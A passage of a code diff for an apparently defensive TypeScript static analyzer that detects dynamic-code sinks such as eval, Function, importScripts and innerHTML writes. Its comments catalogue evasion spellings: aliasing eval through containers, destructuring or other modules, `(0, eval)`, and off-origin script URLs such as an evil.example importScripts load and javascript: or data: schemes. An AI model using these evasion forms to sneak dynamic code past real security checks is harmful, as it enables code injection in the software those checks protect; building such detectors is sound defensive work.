-  return [...byKey.values()].sort((a, b) => a.line - b.line || a.label.localeCompare(b.label));
-}
-
 export interface SinkFinding {
   readonly label: string;
   readonly line: number;
@@ -814,731 +139,2176 @@ export interface SinkFinding {
   readonly text: string;
 }
 
-/**
- * The argument runs a sink's code predicate must be tested against.
- *
- * `position` says where the code starts and whether it arrives inside an array
- * (the `.apply` / `Reflect.apply` form). A VARIADIC sink is tested against
- * every argument from that point on — `importScripts` loads each URL it is
- * handed, so judging only the first would clear
- * `importScripts('/local.js', 'https://evil.example/x.js')`.
- */
-function codeArguments(
-  args: readonly Token[][],
-  position: { index: number; inArray: boolean },
-  variadic: boolean,
-): Token[][] {
-  if (position.inArray) {
-    const array = args[position.index] ?? [];
-    if (!isPunct(array[0], '[')) return [];
-    // `['code', …]` — the elements are split out the same way a call's
-    // arguments are, so later elements and the closing bracket never remain
-    // attached to the one being judged.
-    const elements = callArguments(array, 0);
-    return variadic ? elements : [elements[0] ?? []];
-  }
-  const rest = args.slice(position.index);
-  return variadic ? rest : [rest[0] ?? []];
-}
+/** Receivers that ARE the global object, so `X.eval` is the global `eval`. */
+const GLOBAL_RECEIVERS: ReadonlySet<string> = new Set([
+  'globalThis',
+  'window',
+  'self',
+  'global',
+  'frames',
+  'top',
+  'parent',
+]);
+
+/** Methods that invoke their receiver, so `F.call(…)` still runs `F`. */
+const INVOKERS: ReadonlySet<string> = new Set(['call', 'apply', 'bind']);
+
+/** `Reflect` methods that invoke their FIRST argument. */
+const REFLECT_INVOKERS: ReadonlySet<string> = new Set(['apply', 'construct']);
 
 /**
- * Which argument carries the code, given the inherited method the sink was
- * invoked through. `null` ⇒ the method is not an invocation of the sink at all
- * (`Function.toString()` is not a sink), so the walk stops.
+ * Operators that WRITE the property they are applied to.
+ *
+ * `+=` appends markup as destructively as `=` does, and the logical forms write
+ * it too — `node.innerHTML ||= payload` sets it whenever the element is empty,
+ * which is exactly when a sink assignment matters.
  */
-function codeArgumentIndex(method: string | undefined): { index: number; inArray: boolean } | null {
-  if (method === undefined) return { index: 0, inArray: false };
-  if (method === 'call' || method === 'bind') return { index: 1, inArray: false };
-  if (method === 'apply') return { index: 1, inArray: true };
-  return null;
-}
+const WRITING_ASSIGNMENTS: ReadonlySet<number> = new Set([
+  SyntaxKind.EqualsToken,
+  SyntaxKind.PlusEqualsToken,
+  SyntaxKind.BarBarEqualsToken,
+  SyntaxKind.AmpersandAmpersandEqualsToken,
+  SyntaxKind.QuestionQuestionEqualsToken,
+]);
+
+/** Bindings that name a value declared in ANOTHER module. */
+const IMPORT_BINDINGS: ReadonlySet<number> = new Set([
+  SyntaxKind.ImportSpecifier,
+  SyntaxKind.ImportClause,
+  SyntaxKind.NamespaceImport,
+  SyntaxKind.ImportEqualsDeclaration,
+]);
+
+/** Wrappers that yield exactly the expression they wrap. */
+const TRANSPARENT: ReadonlySet<number> = new Set([
+  SyntaxKind.ParenthesizedExpression,
+  SyntaxKind.AsExpression,
+  SyntaxKind.SatisfiesExpression,
+  SyntaxKind.NonNullExpression,
+  SyntaxKind.TypeAssertionExpression,
+]);
+
+/** How far an alias chain is followed before it is treated as a cycle. */
+const MAX_HOPS = 24;
+
+/** Operators that SELECT one of their operands, either of which may run. */
+const SELECTORS: ReadonlySet<number> = new Set([
+  SyntaxKind.BarBarToken,
+  SyntaxKind.AmpersandAmpersandToken,
+  SyntaxKind.QuestionQuestionToken,
+]);
 
 /**
- * Find dynamic-code sink INVOCATIONS in `source`.
+ * Strip everything that changes nothing about what an expression evaluates to.
  *
- * Both lexings of the ambiguous `/` are analysed and the results unioned, so a
- * lexer guess can never hide a call — see {@link tokenize}.
+ * A COMMA expression is one of them: `(0, eval)` evaluates to `eval`, and the
+ * `(0, …)` wrapper is the idiomatic way to call a global without a receiver.
  */
-export function findSinkInvocations(source: string, specs: readonly SinkSpec[]): SinkFinding[] {
-  const byKey = new Map<string, SinkFinding>();
-  const lineStarts: number[] = [0];
-  for (let k = 0; k < source.length; k += 1) if (source[k] === '\n') lineStarts.push(k + 1);
-  const lineOf = (offset: number): number => {
-    let lo = 0;
-    let hi = lineStarts.length - 1;
-    while (lo < hi) {
-      const mid = (lo + hi + 1) >> 1;
-      if ((lineStarts[mid] as number) <= offset) lo = mid;
-      else hi = mid - 1;
-    }
-    return lo + 1;
-  };
-
-  /**
-   * Analyse a token stream, then RECURSE into every template interpolation it
-   * contains.
-   *
-   * A template's `${…}` spans are EXECUTABLE CODE, not text. The literal stays
-   * one token so a tag call and a string argument still read correctly, and
-   * each span is analysed in its own right with offsets shifted back onto the
-   * original source so reported lines stay true. The recursion is what makes
-   * a NESTED interpolation work, which a single extra pass would have missed.
-   */
-  const visit = (tokens: readonly Token[], preferRegex: boolean, depth: number): void => {
-    for (const found of analyse(tokens, specs, source, lineOf)) {
-      byKey.set(`${found.line}:${found.label}:${found.text}`, found);
-    }
-    if (depth >= 16) return; // real code never nests templates this deep
-    for (const token of tokens) {
-      if (token.kind !== 'template') continue;
-      for (const span of interpolationSpans(token.value, token.start, preferRegex)) {
-        const inner = tokenize(span.text, preferRegex).map((t) => ({
-          ...t,
-          start: t.start + span.offset,
-          end: t.end + span.offset,
-        }));
-        visit(inner, preferRegex, depth + 1);
-      }
-    }
-  };
-
-  for (const preferRegex of [false, true]) visit(tokenize(source, preferRegex), preferRegex, 0);
-  return [...byKey.values()].sort((a, b) => a.line - b.line || a.label.localeCompare(b.label));
-}
-
-/**
- * Every local name through which a sink can be reached.
- *
- * `direct` holds `NAME → sink` (`const F = Function`). `members` holds
- * `OBJECT → property → sink`, which is what makes an object a RECEIVER —
- * exactly the relationship `globalThis`/`window`/`self` already had, so a
- * user-defined `const o = { run: eval }` is resolved by the same lookup rather
- * than by a second mechanism.
- */
-/**
- * What a receiver's property holds: a SINK, or ANOTHER RECEIVER.
- *
- * Recursive because containers nest — `const h = [[eval]]` and
- * `const o = { list: [eval] }` are as ordinary as the one-level forms, and a
- * table that could only hold sinks would have supported arrays "one level
- * deep", which is exactly the sort of caveat that becomes the next bypass.
- */
-type ReceiverEntry =
-  | { readonly kind: 'sink'; readonly spec: SinkSpec }
-  | { readonly kind: 'table'; readonly table: ReceiverTable };
-type ReceiverTable = ReadonlyMap<string, ReceiverEntry>;
-
-interface AliasTable {
-  readonly direct: Map<string, SinkSpec>;
-  /**
-   * Read-only by contract: aliasing a receiver SHARES its table rather than
-   * copying it (`const g = globalThis` hands `g` the global sink map itself),
-   * so a mutation through one name would silently change the other.
-   */
-  readonly members: Map<string, ReceiverTable>;
-}
-
-/** The globals adapted to a receiver table, so every lookup is the same lookup. */
-function globalReceiverTable(specByName: ReadonlyMap<string, SinkSpec>): ReceiverTable {
-  return new Map([...specByName].map(([key, spec]) => [key, { kind: 'sink', spec } as const]));
-}
-
-/**
- * Follow member accesses from `start` through `table`, returning the sink the
- * chain lands on. Descends while a property holds another receiver, so
- * `h[0][0](…)` and `o.list[0](…)` resolve by the same walk that `o.run(…)`
- * does.
- */
-function descendReceiver(
-  tokens: readonly Token[],
-  table: ReceiverTable,
-  start: number,
-): { spec: SinkSpec; next: number } | null {
-  let current = table;
-  let j = start;
-  for (let steps = 0; steps < 16; steps += 1) {
-    const member = readMember(tokens, j);
-    if (!member) return null;
-    const entry = current.get(member.name);
-    if (!entry) return null;
-    if (entry.kind === 'sink') return { spec: entry.spec, next: member.next };
-    current = entry.table;
-    j = member.next;
-  }
-  return null;
-}
-
-/**
- * Names bound to a sink, so `const F = Function; F('x')()` is caught.
- *
- * Deliberately flow-INSENSITIVE: a binding is recognised wherever it is
- * written and treated as holding for the whole file, iterating to a fixpoint
- * so an alias of an alias resolves too. Every binding FORM below is one
- * spelling of a single act — giving a sink another name — so all of them
- * resolve through the same two tables rather than through separate rules:
- *
- *     const F = Function                  → direct
- *     const { eval: run } = globalThis    → direct, via a receiver's property
- *     const [run] = [eval]                → direct, via an index
- *     const o = { run: eval }             → member, making `o` a receiver
- *     const h = [eval]                    → member, indexed by position
- *     const g = globalThis                → member, ALIASING a receiver
- *
- * Containers nest (`{ list: [eval] }`, `[[eval]]`) because a receiver's
- * property may hold another receiver, and the member walk descends.
- *
- * What it still does NOT do, stated plainly rather than implied: reassignment
- * (the last binding seen wins), a sink placed into a container after it is
- * built (`h.push(eval)`, `o.run = eval`), and anything needing real scope
- * analysis — a shadowed name in an inner block is treated as the outer one.
- * Those need data flow, not lexing; erring toward reporting is the safe
- * direction for a gate. The CSP remains the runtime half in the browser; in
- * `apps/api`, where there is none, this is the reachable-spelling half.
- */
-/**
- * The index of a declaration's INITIALIZER, given the declared name at
- * `nameIndex`, or null when there is no `=`.
- *
- * A TypeScript annotation sits between the two — `const F: FunctionConstructor
- * = Function` — so requiring `=` immediately after the name missed every typed
- * alias, which in a TypeScript-first repository is the normal way to write one.
- * `=>` and `===` lex as their own tokens, so neither can be mistaken for the
- * assignment.
- */
-function initializerIndex(tokens: readonly Token[], nameIndex: number): number | null {
-  let k = nameIndex + 1;
-  if (isPunct(tokens[k], '=')) return k + 1;
-  if (!isPunct(tokens[k], ':')) return null;
-  let depth = 0;
-  for (let steps = 0; steps < 64 && k < tokens.length; steps += 1, k += 1) {
-    const t = tokens[k];
-    if (t?.kind !== 'punct') continue;
-    if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-    else if (t.value === ')' || t.value === ']' || t.value === '}') {
-      if (depth === 0) return null;
-      depth -= 1;
-    } else if (depth === 0 && t.value === ';') return null;
-    else if (depth === 0 && t.value === '=') return k + 1;
-  }
-  return null;
-}
-
-/**
- * The `key` / `key: value` entries of the brace group opened at `open`, at its
- * top level only. Serves both an object LITERAL and a destructuring PATTERN,
- * which share this shape.
- */
-function braceEntries(
-  tokens: readonly Token[],
-  open: number,
-): {
-  entries: Array<{ key: string; valueIndex: number; shorthand: boolean }>;
-  next: number;
-} | null {
-  const end = matchGroup(tokens, open);
-  if (end === -1) return null;
-  const entries: Array<{ key: string; valueIndex: number; shorthand: boolean }> = [];
-  let k = open + 1;
-  while (k < end - 1) {
-    const keyToken = tokens[k];
-    let key: string | null = null;
-    if (keyToken?.kind === 'ident') key = keyToken.value;
-    else if (isStringToken(keyToken)) key = stringValue(keyToken);
-    else if (isPunct(keyToken, '[')) {
-      // A computed key — `{ ['ev' + 'al']: run }` — folds like any subscript.
-      const computed = computedName(tokens, k);
-      if (computed) {
-        key = computed.name;
-        k = computed.next - 1;
-      }
-    }
-    if (key === null) {
-      // Anything unrecognised (a spread, a method, a nested pattern): skip to
-      // the next top-level comma rather than mis-pairing the entries after it.
-      let depth = 0;
-      while (k < end - 1) {
-        const t = tokens[k];
-        if (t?.kind === 'punct') {
-          if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-          else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
-          else if (t.value === ',' && depth === 0) break;
-        }
-        k += 1;
-      }
-      k += 1;
+function unwrap(node: Syntax | undefined): Syntax | undefined {
+  let current = node;
+  for (let hop = 0; current !== undefined && hop <= MAX_HOPS; hop += 1) {
+    if (TRANSPARENT.has(current.kind)) {
+      current = current.expression;
       continue;
     }
-    k += 1;
-    const shorthand = !isPunct(tokens[k], ':');
-    const valueIndex = shorthand ? k - 1 : k + 1;
-    entries.push({ key, valueIndex, shorthand });
-    // Advance past this entry's value to the next top-level comma.
-    let depth = 0;
-    while (k < end - 1) {
-      const t = tokens[k];
-      if (t?.kind === 'punct') {
-        if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-        else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
-        else if (t.value === ',' && depth === 0) break;
-      }
-      k += 1;
+    if (
+      current.kind === SyntaxKind.BinaryExpression &&
+      current.operatorToken?.kind === SyntaxKind.CommaToken
+    ) {
+      current = current.right;
+      continue;
     }
-    k += 1;
+    return current;
   }
-  return { entries, next: end };
+  return current;
+}
+
+/** An identifier's NAME, with any `\u` escape already resolved. */
+function nameOf(node: Syntax): string {
+  return node.text ?? node.getText();
+}
+
+/** The arguments of a call, in order. */
+function argumentsOf(call: Syntax): Syntax[] {
+  const args: Syntax[] = [];
+  for (const arg of call.arguments ?? []) args.push(arg);
+  return args;
+}
+
+/** The child nodes of a node, in order. */
+function childrenOf(node: Syntax): Syntax[] {
+  const children: Syntax[] = [];
+  node.forEachChild((child: Syntax) => {
+    children.push(child);
+  });
+  return children;
 }
 
 /**
- * The token index at which each top-level element of the `[ … ]` opened at
- * `open` begins. A hole (`[, eval]`) still occupies its position, so indices
- * line up with the runtime ones.
- */
-function arrayElementIndices(tokens: readonly Token[], open: number): number[] {
-  const end = matchGroup(tokens, open);
-  if (end === -1) return [];
-  const starts: number[] = [];
-  let depth = 0;
-  let expectElement = true;
-  for (let k = open + 1; k < end - 1; k += 1) {
-    const t = tokens[k] as Token;
-    if (expectElement) {
-      starts.push(k);
-      expectElement = false;
-    }
-    if (t.kind === 'punct') {
-      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
-      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
-      else if (t.value === ',' && depth === 0) expectElement = true;
-    }
-  }
-  return starts;
-}
-
-/**
- * The sink table an object or array LITERAL at `i` exposes, or null.
+ * A value a resolution can arrive at.
  *
- * An array is an indexed container, so its keys are its index strings and
- * nothing else about the lookup differs from an object's. Shared by the alias
- * collector (which binds the table to a NAME) and the scan loop (which indexes
- * a literal IN PLACE), so the two cannot disagree about what a literal holds.
+ * FOUR kinds, and the two beyond the obvious pair are what keep every sink
+ * inside one model:
+ *
+ *   • `node` — an expression written in this file.
+ *   • `global` — a name with no declaration here.  Globals are named rather
+ *     than pointed at because they have none: `eval` IS its name, and that is
+ *     what a spec matches.
+ *   • `member` — a METHOD ON a receiver, `document.write`.  It is a value for
+ *     the same reason a global is: `const write = document.write` copies the
+ *     method, so a detector that reads the ACCESS syntax sees nothing and one
+ *     that reads the value sees it.  Member sinks used to be found by matching
+ *     the shape of the access and its parent, which is why exactly one `const`
+ *     hid the most explicitly forbidden call in the project.
+ *   • `result` — whatever CALLING another value yields.  Written as a wrapper
+ *     rather than resolved on the spot so that "the function being called" is
+ *     resolved by the same relation as everything else: `flowsInto` on a
+ *     `result` either reads a function's returns or DISTRIBUTES over the
+ *     callee's own flow.  The previous shape — a `returnedBy` helper that
+ *     re-implemented identifier and property resolution — was the last walker
+ *     left outside the unification, and it missed every callee reached through
+ *     an alias or held in an object.
  */
-function literalReceiverTable(
-  tokens: readonly Token[],
-  i: number,
-  resolveAt: (index: number) => SinkSpec | null,
-  depth = 0,
-): ReceiverTable | null {
-  if (depth > 8) return null; // real code never nests containers this deep
-  const table = new Map<string, ReceiverEntry>();
-  /** A value is either a nested container or a plain sink reference. */
-  const entryAt = (index: number): ReceiverEntry | null => {
-    const at = unwrapReference(tokens, index);
-    const nested = literalReceiverTable(tokens, at, resolveAt, depth + 1);
-    if (nested) return { kind: 'table', table: nested };
-    const spec = resolveAt(at);
-    return spec ? { kind: 'sink', spec } : null;
-  };
-  if (isPunct(tokens[i], '{')) {
-    const group = braceEntries(tokens, i);
-    if (!group) return null;
-    for (const entry of group.entries) {
-      const value = entryAt(entry.valueIndex);
-      if (value) table.set(entry.key, value);
-    }
-  } else if (isPunct(tokens[i], '[')) {
-    arrayElementIndices(tokens, i).forEach((start, index) => {
-      const value = entryAt(start);
-      if (value) table.set(String(index), value);
-    });
-  } else return null;
-  return table.size > 0 ? table : null;
+type Value =
+  | { readonly kind: 'node'; readonly node: Syntax }
+  | { readonly kind: 'global'; readonly name: string }
+  | { readonly kind: 'member'; readonly access: Syntax; readonly property: string }
+  | { readonly kind: 'result'; readonly of: Value };
+
+const nodeValue = (node: Syntax): Value => ({ kind: 'node', node });
+const globalValue = (name: string): Value => ({ kind: 'global', name });
+const memberValue = (access: Syntax, property: string): Value => ({
+  kind: 'member',
+  access,
+  property,
+});
+const resultValue = (of: Value): Value => ({ kind: 'result', of });
+
+/** A structural identity for a value, so a search visits each one once. */
+function valueKey(value: Value): string {
+  switch (value.kind) {
+    case 'global':
+      return `g:${value.name}`;
+    case 'member':
+      return `m:${value.access.getStart()}:${value.access.getEnd()}:${value.property}`;
+    case 'result':
+      return `r:${valueKey(value.of)}`;
+    default:
+      return `n:${value.node.getStart()}:${value.node.getEnd()}`;
+  }
 }
 
-function collectAliases(
-  tokens: readonly Token[],
-  specByName: ReadonlyMap<string, SinkSpec>,
-  resolve: (i: number, aliases: AliasTable) => SinkSpec | null,
-): AliasTable {
-  const aliases: AliasTable = { direct: new Map(), members: new Map() };
-  // The globals ARE a receiver table; adapting them once means every lookup
-  // below is the same lookup, whatever the receiver turned out to be.
-  const globalTable = globalReceiverTable(specByName);
+/**
+ * A ceiling on one resolution, which EXISTS ONLY TO BE UNREACHABLE.
+ *
+ * Termination does not depend on it: every key is derived from a node range or
+ * a global name, both finite in a file, so the search ends on its own.  The
+ * ceiling is a backstop against a defect in that reasoning — so exceeding it
+ * THROWS rather than returning what was found so far.
+ *
+ * It used to be 512 and it used to return quietly, which made it a bypass: 512
+ * benign assignments to a name, then the sink, and the search stopped short of
+ * the assignment that mattered and reported the file clean.  A ceiling a gate
+ * can be padded past is worse than no ceiling at all.
+ */
+const MAX_VALUES = 200_000;
+
+/** Where a sink's code argument starts, and whether it arrives inside an array. */
+interface CodePosition {
+  readonly index: number;
+  readonly inArray: boolean;
+}
+
+/** The static leading text of a string expression, or `null` when unknown. */
+function staticPrefix(
+  node: Syntax | undefined,
+  hop = 0,
+  held?: (node: Syntax) => readonly Syntax[],
+): string | null {
+  const target = unwrap(node);
+  if (target === undefined || hop > MAX_HOPS) return null;
+  if (
+    target.kind === SyntaxKind.StringLiteral ||
+    target.kind === SyntaxKind.NoSubstitutionTemplateLiteral
+  ) {
+    return target.text ?? '';
+  }
+  // A template's HEAD is everything before the first hole, which is all a
+  // scheme check can depend on.
+  if (target.kind === SyntaxKind.TemplateExpression) return target.head?.text ?? '';
+  if (
+    target.kind === SyntaxKind.BinaryExpression &&
+    target.operatorToken?.kind === SyntaxKind.PlusToken
+  ) {
+    const left = staticPrefix(target.left, hop + 1, held);
+    if (left === null) return null;
+    const right = staticPrefix(target.right, hop + 1, held);
+    return right === null ? left : left + right;
+  }
+  // A NAME holding the text folds to what it holds, when the caller can say:
+  // `const scheme = 'javascript'; scheme + ':alert(1)'` navigates exactly as
+  // the spelled literal does, and reading syntax alone saw two halves of
+  // nothing.
+  if (held !== undefined && target.kind === SyntaxKind.Identifier) {
+    for (const value of held(target)) {
+      if (value.getStart() === target.getStart()) continue;
+      const folded = staticPrefix(value, hop + 1, held);
+      if (folded !== null) return folded;
+    }
+  }
+  return null;
+}
+
+/**
+ * The code argument is a STRING — the implicit-eval timer form.
+ *
+ * An INTERPOLATED template counts: a template with holes is still a string the
+ * host compiles, so requiring a fully static literal would miss the form an
+ * attacker is most likely to use.
+ */
+export const isStringLiteral = (values: readonly SinkValue[]): boolean =>
+  values.some((value) => ('coercedString' in value ? true : isStringLike(value)));
+
+/** Whether ONE expression is a string the host would compile. */
+function isStringLike(node: Syntax | undefined): boolean {
+  const target = unwrap(node);
+  if (target === undefined) return false;
+  if (
+    target.kind === SyntaxKind.StringLiteral ||
+    target.kind === SyntaxKind.NoSubstitutionTemplateLiteral ||
+    target.kind === SyntaxKind.TemplateExpression
+  ) {
+    return true;
+  }
+  // Concatenation with a string YIELDS a string, whichever side it is on.
+  if (
+    target.kind === SyntaxKind.BinaryExpression &&
+    target.operatorToken?.kind === SyntaxKind.PlusToken
+  ) {
+    return isStringLike(target.left) || isStringLike(target.right);
+  }
+  return false;
+}
+
+/**
+ * The code argument is a statically known URL that is NOT same-origin.
+ *
+ * An ALLOWLIST, not a denylist of remote schemes.  Listing the bad schemes is
+ * the enumerate-the-spellings mistake in another costume: `http(s)://` and
+ * protocol-relative `//` were listed, so `data:text/javascript,…`, `blob:`,
+ * `javascript:` and `file:` all read as same-origin and loaded executable code
+ * past the gate.  What the gate enforces is "same-origin imports only", and the
+ * same-origin forms are the CLOSED set — a relative reference, with no scheme
+ * and no authority.  Everything else is rejected, including schemes that do not
+ * exist yet.
+ *
+ * A non-static argument yields `false`: the gate cannot evaluate
+ * `importScripts(url)` and does not pretend to.  The CSP is the runtime half.
+ *
+ * URL-parser quirks are normalised first, because the browser normalises them
+ * too and a check that skipped it would be reading a different URL than the one
+ * that gets fetched: tabs and newlines are STRIPPED anywhere in a URL, and
+ * leading control characters and spaces are trimmed.  A leading `\` is a `/`
+ * for a special scheme, so `\\evil.example/x.js` is protocol-relative just as
+ * `//evil.example/x.js` is.
+ */
+export const isNonSameOriginUrl = (values: readonly SinkValue[]): boolean =>
+  // A coercion says a value is a STRING, not which URL it is, so it answers
+  // nothing here and is skipped rather than guessed at.
+  values.some((value) => !('coercedString' in value) && isOffOrigin(value));
+
+/** Whether ONE expression is a statically known URL that is not same-origin. */
+function isOffOrigin(node: Syntax): boolean {
+  const prefix = staticPrefix(node);
+  if (prefix === null) return false;
+  // Written without a control-character regex class (which the linter forbids,
+  // rightly — they are unreadable) but doing exactly what the URL parser does.
+  const stripped = [...prefix].filter((c) => c !== '\t' && c !== '\n' && c !== '\r').join('');
+  let from = 0;
+  while (from < stripped.length && (stripped.codePointAt(from) ?? 0x21) <= 0x20) from += 1;
+  const url = stripped.slice(from);
+  if (/^[/\\]{2}/.test(url)) return true; // protocol-relative (either slash)
+  return /^[A-Za-z][A-Za-z0-9+.-]*:/.test(url); // ANY scheme is off-origin
+}
+
+/**
+ * Everything one file needs to answer "is this expression a sink".
+ *
+ * A closure rather than free functions because every answer depends on the
+ * project the handles came from and on the container table built for this file.
+ */
+function analyser(root: Syntax, project: Project, source: string, batch: ReadonlySet<string>) {
+  const filePath = String(root.path);
+  /**
+   * Whether a declaration belongs to a source in THIS SCAN.
+   *
+   * The question used to be "is it in THIS FILE", which made every import look
+   * like a global: `export const run = eval` in one module and `run(payload)`
+   * in another were two unrelated programs, and the invocation resolved to a
+   * name with no declaration — the same answer a real global gives.  Splitting
+   * an alias across a module boundary walked past every sink gate that way.
+   */
+  const inBatch = (path: unknown): boolean => batch.has(String(path));
+  /**
+   * The file a node belongs to.
+   *
+   * Only the ROOT carries `path`, so a nested node is asked for its source
+   * file — which matters now that a declaration this follows may live in
+   * ANOTHER source of the batch, where the offsets mean something else.
+   */
+  const pathOf = (node: Syntax): string =>
+    String(node.getSourceFile?.()?.path ?? node.path ?? filePath);
+
+  const symbolAt = (node: Syntax) =>
+    project.checker.getSymbolAtPosition(pathOf(node), node.getStart());
 
   /**
-   * The sink table an expression at `i` exposes, if it is a RECEIVER — an
-   * object through which sinks are reachable by property name.
+   * Whether an identifier names a GLOBAL rather than something declared here.
    *
-   * Four things qualify, and they are deliberately one function rather than
-   * four branches at four call sites: a global (`globalThis`), a name already
-   * bound to a table, an object LITERAL, and an ARRAY literal. An array is
-   * just an indexed container, so its keys are its index strings and nothing
-   * about the lookup changes.
+   * This is the whole of the scoping question, and the compiler answers it: a
+   * parameter called `eval`, a `const eval` in a block, an import — each has a
+   * declaration in this file, and none of them is the global sink.
    */
-  const receiverAt = (i: number): ReceiverTable | null => {
-    const t = tokens[i];
-    if (t?.kind === 'ident') {
-      if (GLOBAL_RECEIVERS.has(t.value)) return globalTable;
-      return aliases.members.get(t.value) ?? null;
-    }
-    return literalReceiverTable(tokens, i, (index) => resolve(index, aliases));
+  const isGlobalBinding = (node: Syntax): boolean => {
+    const symbol = symbolAt(node);
+    if (symbol === undefined) return true;
+    return !symbol.declarations.some((declaration) => inBatch(declaration.path));
   };
 
-  /** The index just past a receiver expression at `i`. */
-  const receiverEnd = (i: number): number => {
-    if (isPunct(tokens[i], '{') || isPunct(tokens[i], '[')) {
-      const end = matchGroup(tokens, i);
-      return end === -1 ? i + 1 : end;
-    }
-    return i + 1;
+  /** The declaration a local name binds to, resolved to a node. */
+  const localDeclaration = (node: Syntax): Syntax | undefined => {
+    const symbol = symbolAt(node);
+    const handle = symbol?.declarations.find((declaration) => inBatch(declaration.path));
+    return handle?.resolve(project) as Syntax | undefined;
   };
 
-  // A fixpoint: each pass can bind a name to a sink that the previous pass
-  // only just learned about. Bounded because every pass either adds a binding
-  // or stops.
-  for (let pass = 0; pass < 8; pass += 1) {
-    const before = aliases.direct.size + aliases.members.size;
+  /**
+   * A statically known property name, whatever spelling reaches it.
+   *
+   * `o.run`, `o['run']` and `o[key]` after `const key = 'run'` name the same
+   * property; the key's TYPE settles all three, so no rule is needed per form.
+   */
+  const propertyName = (node: Syntax): string | undefined => {
+    if (node.kind === SyntaxKind.PropertyAccessExpression) {
+      return node.name === undefined ? undefined : nameOf(node.name);
+    }
+    if (node.kind !== SyntaxKind.ElementAccessExpression) return undefined;
+    const argument = node.argumentExpression;
+    if (argument === undefined) return undefined;
+    const type = project.checker.getTypeAtLocation(asNode(argument));
+    if (type?.isStringLiteralType() === true) return String(type.value);
+    if (type?.isNumberLiteralType() === true) return String(type.value);
+    // A literal the checker did not narrow (a `.js` source has no `as const`).
+    if (argument.kind === SyntaxKind.NumericLiteral) return argument.text ?? argument.getText();
+    // A key the checker did not narrow, including a COMPOSED one:
+    // `node['inner' + 'HTML']` names the same property as the plain spelling.
+    return staticPrefix(argument) ?? undefined;
+  };
 
-    for (let i = 0; i + 2 < tokens.length; i += 1) {
-      // `const { eval: run } = globalThis` — a destructuring PATTERN, whose
-      // properties are read out of the receiver on the right.
-      if (isPunct(tokens[i], '{')) {
-        const group = braceEntries(tokens, i);
-        if (group && isPunct(tokens[group.next], '=')) {
-          const table = receiverAt(unwrapReference(tokens, group.next + 1));
-          if (table) {
-            for (const entry of group.entries) {
-              const held = table.get(entry.key);
-              const local = tokens[entry.valueIndex];
-              if (!held || local?.kind !== 'ident') continue;
-              // A destructured property may itself be a container, so the
-              // local name becomes a receiver rather than a direct binding.
-              if (held.kind === 'sink') aliases.direct.set(local.value, held.spec);
-              else aliases.members.set(local.value, held.table);
+  /**
+   * A stable key for the object a property hangs off.
+   *
+   * CANONICAL, because a second name for the same object is the same object:
+   * `const alias = registry` must key where `registry` does, or a property
+   * written through one name is invisible when read through the other.  So a
+   * binding whose initializer is another identifier is followed to the name it
+   * ultimately holds.
+   *
+   * That following stops at a GLOBAL, and the standard spellings OF the global
+   * object collapse to ONE key there — `globalThis`, `window`, `self`, `top`
+   * and the rest denote the same object at runtime, so a property written
+   * through any of them is readable through all of them.  Keeping the spellings
+   * apart made `window.run = eval; globalThis.run(payload)` invisible: two keys
+   * for one slot, the write filed under the first and the read looked up under
+   * the second.  `const g = globalThis` canonicalises there too.
+   */
+  const receiverKey = (base: Syntax, hop = 0): string | undefined => {
+    const target = unwrap(base);
+    if (target === undefined || hop > MAX_HOPS) return undefined;
+    // A LITERAL is its own identity — it needs no name to be written into.
+    // `Object.assign({}, { run: eval }).run(p)` fills a container that is never
+    // bound to anything, and a key that required an identifier could not
+    // record the write at all.
+    if (
+      target.kind === SyntaxKind.ObjectLiteralExpression ||
+      target.kind === SyntaxKind.ArrayLiteralExpression
+    ) {
+      return `literal:${target.getStart()}:${target.getEnd()}`;
+    }
+    if (target.kind !== SyntaxKind.Identifier) return undefined;
+    const declaration = symbolAt(target)?.declarations.find((each) => inBatch(each.path));
+    if (declaration === undefined) {
+      const name = nameOf(target);
+      return GLOBAL_RECEIVERS.has(name) ? 'global:@globalThis' : `global:${name}`;
+    }
+    const bound = unwrap(
+      (declaration.resolve(project) as unknown as Syntax | undefined)?.initializer,
+    );
+    if (bound?.kind === SyntaxKind.Identifier) return receiverKey(bound, hop + 1);
+    return `${String(declaration.path)}#${declaration.index}`;
+  };
+
+  /**
+   * Properties WRITTEN into a container: `const o = {}; o.run = eval`.
+   *
+   * Building a registry empty and filling it afterwards is the ordinary way one
+   * is populated, so reading only the literal left the whole pattern open.
+   */
+  const written = new Map<string, Syntax[]>();
+  /**
+   * Values assigned to a NAME after it was declared.
+   *
+   * `let execute; execute = eval` gives the binding no initializer to read, and
+   * a declaration is only where a name STARTS.  Every reaching assignment is
+   * collected, because a gate must fire if any of them makes the name a sink.
+   */
+  const rebound = new Map<string, Syntax[]>();
+  // Deferred: resolving a DESTRUCTURING target needs `heldAt`, which is defined
+  // below, so the walk is invoked once the closure is fully built.
+  const collectAssignments = (): void => {
+    for (const node of walk(root)) {
+      if (node.kind !== SyntaxKind.BinaryExpression) continue;
+      if (node.operatorToken?.kind !== SyntaxKind.EqualsToken) continue;
+      const target = unwrap(node.left);
+      const value = node.right;
+      if (target === undefined || value === undefined) continue;
+      if (target.kind === SyntaxKind.Identifier) {
+        const key = receiverKey(target);
+        if (key !== undefined) rebound.set(key, [...(rebound.get(key) ?? []), value]);
+        continue;
+      }
+      // `({ run: execute } = { run: eval })` rebinds `execute` exactly as
+      // `execute = eval` does — a destructuring assignment is still an assignment.
+      if (
+        target.kind === SyntaxKind.ObjectLiteralExpression ||
+        target.kind === SyntaxKind.ArrayLiteralExpression
+      ) {
+        const isArray = target.kind === SyntaxKind.ArrayLiteralExpression;
+        childrenOf(target).forEach((member, index) => {
+          const bound = member.kind === SyntaxKind.PropertyAssignment ? member.initializer : member;
+          const from = isArray ? String(index) : nameOf(member.name ?? member);
+          if (bound?.kind !== SyntaxKind.Identifier || from === undefined) return;
+          const key = receiverKey(bound);
+          const held = heldAt(value, from, 0);
+          if (key === undefined || held === undefined) return;
+          rebound.set(key, [...(rebound.get(key) ?? []), held]);
+        });
+        continue;
+      }
+      if (
+        target.kind !== SyntaxKind.PropertyAccessExpression &&
+        target.kind !== SyntaxKind.ElementAccessExpression
+      ) {
+        continue;
+      }
+      const base = target.expression;
+      const name = propertyName(target);
+      const key = base === undefined ? undefined : receiverKey(base);
